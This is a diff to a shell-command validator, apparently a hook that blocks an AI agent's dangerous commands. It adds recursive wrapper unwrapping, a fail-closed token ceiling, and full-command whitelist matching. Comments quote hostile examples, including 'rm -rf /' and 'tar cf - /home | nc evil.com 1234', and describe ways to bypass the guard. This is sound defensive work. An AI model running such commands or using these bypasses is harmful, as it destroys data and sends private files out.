@@ -420,6 +420,16 @@ _DASH_C_PROGRAM_COMMANDS: frozenset[str] = _SHELL_COMMANDS | _DASH_C_RUNNERS
 # not a hot path. Exceeding it fails closed. Pinned by test_depth_cap_fails_closed.
 MAX_SHELL_DELEGATION_DEPTH = 4
 
+# Ceiling on distinct (command, tail) suffixes one top-level extraction may visit. Legitimate
+# commands need a few dozen at most. Past it the command is adversarial and extraction fails
+# CLOSED: the extractor raises, validate_command's catch-all returns BLOCKED, the hook denies.
+# Needed because the per-call memo bounds ONE wrapper chain, not k independent chains with
+# distinct tails, so total work still grew with command size - and a PreToolUse hook that
+# outlives its timeout fails OPEN. Pinned by test_sibling_chains_past_the_ceiling_fail_closed.
+# ponytail: each suffix costs O(len) for the `args[i+1:]` slice + tuple key, so the worst case
+# under this ceiling is ~0.2 s (measured); index-based re-entry would make it O(1) if needed.
+MAX_DELEGATOR_TOKENS = 256
+
 # `watch`'s own options. Only these consume a following word; everything after the option run
 # belongs to the command. Getting this wrong over-approximates (an option value is prepended to
 # the program), which is the safe direction.
@@ -432,6 +442,15 @@ _FIND_EXEC_FLAGS: frozenset[str] = frozenset({"-exec", "-execdir", "-ok", "-okdi
 # A bare `;` is a bash separator (never reaches find's args); an escaped `\;` or quoted `';'`
 # survives as this literal word, as does `+`. All three end the clause.
 _FIND_EXEC_TERMINATORS: frozenset[str] = frozenset({";", "+"})
+
+# Every base name the extractor itself knows how to unwrap. The wrapper branch re-enters the
+# extractor on each arg that names one of these (LAB-3004), so runner operand semantics,
+# `watch`, `find -exec`, and nested wrappers thread identically to the bare spelling instead of
+# being re-implemented in the wrapper branch. The union of all four recognized-command sets is
+# deliberate: WRAPPER_COMMANDS lets a nested wrapper be skipped past, the program/watch/find
+# members let the wrapped target be found; a member matched sooner only recurses earlier, it
+# can never make the scan miss. su/sg/runuser happen to sit in both unioned sets.
+_DELEGATOR_COMMANDS: frozenset[str] = _DASH_C_PROGRAM_COMMANDS | WRAPPER_COMMANDS | frozenset({"watch", "find"})
 
 
 def _find_exec_clauses(args: list[str]) -> list[list[str]]:
@@ -519,6 +538,8 @@ def _watch_payload(args: list[str]) -> Optional[str]:
 
 def _shell_delegated_payloads(
     commands_with_args: list[tuple[str, list[str]]],
+    *,
+    _seen: Optional[set[tuple[str, tuple[str, ...]]]] = None,
 ) -> list[str]:
     """Extract every argument the command will hand to a shell as source code.
 
@@ -535,13 +556,24 @@ def _shell_delegated_payloads(
     A first word that is neither a delegator nor a wrapper is never scanned, so
     `echo bash -c "rm -rf /"` (which prints the string) and `grep -c pattern file` are untouched.
 
-    KNOWN GAP (LAB-3004): the wrapper branch below re-implements a partial scan rather than
-    recursing, so a wrapper in front of a dash-c *runner* (`timeout 5 sg root -c PROG`) or
-    `watch` (`timeout 5 watch PROG`) loses the payload and scores below the bare form. The
-    `find` branch already recurses correctly; unifying the two is LAB-3004's fix.
+    Raises ValueError past MAX_DELEGATOR_TOKENS distinct suffixes (fail closed, see there).
     """
+    # Each (command, tail) suffix is extracted at most once per top-level call. The wrapper
+    # branch below re-enters on EVERY delegator position and each re-entry rescans its own tail,
+    # so without this a chain of n wrappers (`sudo sudo ... bash -c PROG`) visited every subset
+    # of positions: 2^n calls, 2^(n-1) copies of PROG, each then re-validated. A visited suffix
+    # has already handed its payloads up through the call that first reached it, so skipping it
+    # drops nothing: n distinct suffixes each scanned once, O(n^2) calls in total (the rest are
+    # O(1) skips). Pinned by test_repeated_wrappers_extract_each_suffix_once.
+    seen = set() if _seen is None else _seen
     payloads = []
     for cmd_name, args in commands_with_args:
+        key = (cmd_name, tuple(args))
+        if key in seen:
+            continue
+        seen.add(key)
+        if len(seen) > MAX_DELEGATOR_TOKENS:
+            raise ValueError(f"Shell delegation scan exceeded {MAX_DELEGATOR_TOKENS} delegator tokens")
         base = cmd_name.rsplit("/", 1)[-1]
         found = []
 
@@ -551,19 +583,31 @@ def _shell_delegated_payloads(
             # Each exec clause is a command in its own right; re-run the FULL extractor on it,
             # so a wrapped or nested delegator inside `-exec` is caught for free.
             for clause in _find_exec_clauses(args):
-                found.extend(_shell_delegated_payloads([(clause[0], clause[1:])]))
+                found.extend(_shell_delegated_payloads([(clause[0], clause[1:])], _seen=seen))
         else:
             if base in _DASH_C_PROGRAM_COMMANDS:
                 found.append(_dash_c_payload(args, operand_ends_options=base in _SHELL_COMMANDS))
             if base in WRAPPER_COMMANDS:
-                # `sudo bash -c ...`, `timeout 5 bash -c ...`: find the delegator it wraps.
+                # `sudo bash -c ...`, `timeout 5 sg root -c ...`, `timeout 5 watch ...`: re-enter
+                # the FULL extractor on every arg position that names a recognized command, so
+                # operand semantics, `watch`, `find`, and nested wrappers all thread for free
+                # (LAB-3004) — same `(head, tail)` re-entry the `find` branch above uses.
+                #
+                # EVERY match, not just the first: a wrapper's own operand or option value whose
+                # basename collides with a delegator (`flock ./find sh -c PROG`, the lock file
+                # basenames to `find`; `strace -o bash sg root -c PROG`, the trace file to `bash`)
+                # would otherwise be picked as a decoy that ends the scan and drops the real
+                # payload behind it. Re-validating a benign decoy is harmless over-approximation;
+                # missing a payload is a bypass. Terminates: each re-entry passes `args[i+1:]`.
                 words = [a.rsplit("/", 1)[-1] for a in args]
-                at = next((i for i, w in enumerate(words) if w in _DASH_C_PROGRAM_COMMANDS), None)
-                if at is not None:
-                    found.append(_dash_c_payload(args[at + 1 :]))
+                for i, word in enumerate(words):
+                    if word in _DELEGATOR_COMMANDS:
+                        found.extend(_shell_delegated_payloads([(args[i], args[i + 1 :])], _seen=seen))
 
         payloads.extend(p for p in found if p and p.strip())
-    return payloads
+    # The same program can still surface from more than one delegator (`su su bash -c PROG`:
+    # each `su` owns a -c AND wraps the next). Validating it once is enough.
+    return list(dict.fromkeys(payloads))
 
 
 def _check_contextual_high_risk(
@@ -2300,7 +2344,12 @@ def validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation fl
                 # each segment is evaluated in isolation. Whitelisting the full command
                 # here allows specific safe pipe patterns without whitelisting the
                 # constituent commands standalone.
-                if engine.is_whitelisted(command):
+                #
+                # SECURITY CRITICAL: the pattern must span the WHOLE command, not just
+                # its prefix (is_fully_whitelisted, not is_whitelisted). A prefix match
+                # would let the whitelisted "ls" in "ls; rm -rf /" vouch for every later
+                # segment and skip the loop below entirely.
+                if engine.is_fully_whitelisted(command):
                     result = ValidationResult(
                         allowed=True,
                         risk_level=RiskLevel.SAFE,
@@ -2352,7 +2401,13 @@ def validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation fl
                         alternatives=highest_match.alternatives,
                     )
                 else:
-                    match = engine.match_command(command, string_literals=string_literals)
+                    # No single segment matched a rule; re-check the whole command so
+                    # cross-segment rules (e.g. "tar ... | nc ...") still fire.
+                    # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
+                    # already settled above by is_fully_whitelisted(). match_command()'s
+                    # own whitelist check is prefix-based, and honouring it here would let
+                    # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
+                    match = engine.match_command(command, string_literals=string_literals, use_whitelist=False)
                     all_matched_rules = []
             else:
                 # Single segment - validate both original and reconstructed command
